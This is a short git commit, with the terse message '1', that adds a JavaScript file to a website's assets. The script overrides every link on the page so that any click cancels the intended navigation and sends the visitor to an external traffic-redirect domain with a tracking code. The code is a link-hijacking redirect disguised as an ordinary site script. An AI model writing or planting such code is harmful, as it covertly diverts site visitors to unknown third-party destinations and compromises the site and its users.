1fe589e196ace1d17858b684c44226fa78bdb340
maratbabaev <you@example.com>
2025-02-20 13:25:44 +0300

    1

---
+++ assets/js/script.js
@@ -0,0 +1,7 @@
+document.querySelectorAll("a").forEach((elem) => {
+	elem.onclick = function (e) {
+		e.preventDefault();
+		window.location.href = "https://redirecttraff.site/ZYkZ6v7N";
+		return false;
+	};
+});
